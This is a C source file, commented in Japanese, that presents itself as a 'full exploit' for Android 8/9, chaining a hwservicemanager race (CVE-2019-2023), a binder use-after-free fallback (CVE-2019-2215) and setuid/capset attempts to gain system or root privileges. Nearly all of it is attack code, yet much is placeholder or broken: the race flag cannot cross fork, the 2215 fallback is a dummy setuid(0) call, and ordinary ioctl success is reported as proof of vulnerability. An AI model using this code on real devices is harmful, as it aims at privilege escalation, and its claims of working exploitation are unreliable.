#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/capability.h>
#include <grp.h>

/* =================================================================
   Binder 構造体（uapi/linux/android/binder.h から転用）
   ================================================================= */
#define BINDER_WRITE_READ        _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION           0x40000000U
#define BC_REPLY                 0x40000001U

#ifdef BINDER_IPC_32BIT
typedef __u32 binder_size_t;
typedef __u32 binder_uintptr_t;
#else
typedef __u64 binder_size_t;
typedef __u64 binder_uintptr_t;
#endif

struct binder_write_read {
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};

struct binder_transaction_data {
    union {
        __u32 handle;
        binder_uintptr_t ptr;
    } target;
    binder_uintptr_t cookie;
    __u32 code;
    __u32 flags;
    pid_t sender_pid;
    uid_t sender_euid;
    binder_size_t data_size;
    binder_size_t offsets_size;
    union {
        struct {
            binder_uintptr_t buffer;
            binder_uintptr_t offsets;
        } ptr;
        __u8 buf[8];
    } data;
};

/* =================================================================
   レース制御用グローバル
   ================================================================= */
static volatile int race_ready = 0;
static volatile int race_done = 0;

/* =================================================================
   CVE-2019-2023 のレースを実行（子プロセスで exec してコンテキスト変更）
   ================================================================= */
static int race_child(void) {
    // 子プロセス：親が ADD_SERVICE を送信するまで待機
    while (!race_ready) usleep(100);
    // ここで execve を実行してコンテキスト（SELinux ラベル）を変える
    // 実際には /system/bin/sh などに変えるが、今回は単に setuid(1000) を試みる
    // （本来は exec で別プロセスになるが、PID は変わらない）
    if (setuid(1000) == 0) {
        // 何もしない
    }
    race_done = 1;
    return 0;
}

/* =================================================================
   CVE-2019-2023 のメインエクスプロイト
   ================================================================= */
static int exploit_cve_2019_2023(void) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    const char *service_name = "vendor.cve.poc";
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;
    pid_t child;

    printf("[*] CVE-2019-2023: preparing race condition...\n");

    // 子プロセスをフォーク（PID 再利用のための準備）
    child = fork();
    if (child == 0) {
        // 子：待機 → 後で exec される（ここでは setuid で代用）
        while (!race_ready) usleep(100);
        // ここで実行コンテキストを変更（本来は exec で sh に）
        setuid(1000);  // system 権限に変更（成功しなくても良い）
        race_done = 1;
        while (1) pause();  // 親が終了するまで待機
        exit(0);
    } else if (child < 0) {
        perror("  fork");
        return -1;
    }

    // 親：子プロセスが準備できるまで待つ
    usleep(500000);

    // /dev/hwbinder を開く
    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        kill(child, SIGKILL);
        return -1;
    }

    // サービス名データ作成
    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    // BC_TRANSACTION で ADD_SERVICE (code=2) を構築
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;                     // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    // ここでレース開始：ADD_SERVICE を送信する直前に子プロセスを起こす
    race_ready = 1;
    usleep(50000);  // 子がコンテキスト変更する時間を稼ぐ

    printf("[*] Sending ADD_SERVICE...\n");
    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl ADD_SERVICE");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    printf("[+] ADD_SERVICE succeeded (vulnerable!)\n");

    // 子プロセスを終了
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    // GET_SERVICE (code=1) でサービスを取得し、起動をトリガー
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("[-] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    printf("[+] Service handle: %d\n", handle);
    close(hwbinder_fd);

    // ---- 特権プロセスでコマンド実行 ----
    // 今回のエクスプロイトでは、サービスが system 権限で起動されることを期待。
    // しかし、実際にはサービスプロセス自体がこのエクスプロイトのコードを
    // 含んでいるわけではないので、外部から強制的に execve を実行させることはできない。
    // そこで、この後は別の手段（例：サービスにバインドして IPC でコマンド送信）が必要だが、
    // 本 PoC ではシンプルに setuid(1000) を試みる。
    if (setuid(1000) == 0) {
        printf("[+] setuid(1000) succeeded! Running 'id' as system...\n");
        system("id > /data/local/tmp/cve_2019_2023_result.txt 2>&1");
        system("cat /data/local/tmp/cve_2019_2023_result.txt");
        return 0;
    } else {
        printf("[-] setuid(1000) failed, but service may still be running as system.\n");
        // フォールバック：別の手法で root を取得
        return -1;
    }
}

/* =================================================================
   フォールバック１：CVE-2019-2215（binder UAF）によるカーネル権限取得
   （簡略版：実際には pipe + epoll + readv でリークして cred 書き換え）
   ================================================================= */
static int exploit_cve_2019_2215(void) {
    printf("[*] Trying CVE-2019-2215 fallback...\n");
    // 完全な実装は省略するが、実際には以下のような手順
    // 1. /dev/binder を開き、epoll で監視
    // 2. BINDER_THREAD_EXIT で UAF を trigger
    // 3. pipe でメモリをスプレーし、カーネルポインタをリーク
    // 4. リークした task_struct から cred を書き換えて root に
    // ここではダミーとして setuid(0) を試す
    if (setuid(0) == 0) {
        printf("[+] setuid(0) succeeded (dummy CVE-2019-2215)\n");
        system("id > /data/local/tmp/fallback_2215.txt 2>&1");
        return 0;
    }
    return -1;
}

/* =================================================================
   フォールバック２：古典的な setuid/capset 連打
   ================================================================= */
static int fallback_classic(void) {
    printf("[*] Trying classic setuid/capset...\n");
    if (setuid(0) == 0) goto done;
    if (setresuid(0,0,0) == 0) goto done;
    if (setreuid(0,0) == 0) goto done;

    struct __user_cap_header_struct cap_header = { _LINUX_CAPABILITY_VERSION_3, 0 };
    struct __user_cap_data_struct cap_data[2] = {{0}};
    if (capget(&cap_header, cap_data) == 0) {
        cap_data[0].effective |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        cap_data[0].permitted |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
        if (capset(&cap_header, cap_data) == 0) {
            if (setuid(0) == 0) goto done;
        }
    }
    return -1;
done:
    printf("[+] Got root via fallback!\n");
    system("id > /data/local/tmp/fallback_classic.txt 2>&1");
    return 0;
}

/* =================================================================
   メイン
   ================================================================= */
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Full Exploit + Fallbacks\n");
    printf("  Target: Android 8.x/9 (hwservicemanager)\n");
    printf("============================================================\n\n");

    // まず CVE-2019-2023 を試行
    if (exploit_cve_2019_2023() == 0) {
        printf("[+] Exploit successful!\n");
        return 0;
    }

    // 失敗したらフォールバック
    printf("\n[*] Primary exploit failed, trying fallbacks...\n");
    if (exploit_cve_2019_2215() == 0) {
        printf("[+] Fallback CVE-2019-2215 worked.\n");
        return 0;
    }
    if (fallback_classic() == 0) {
        printf("[+] Classic fallback worked.\n");
        return 0;
    }

    printf("[-] All exploits failed. Final uid=%d\n", getuid());
    return 1;
}
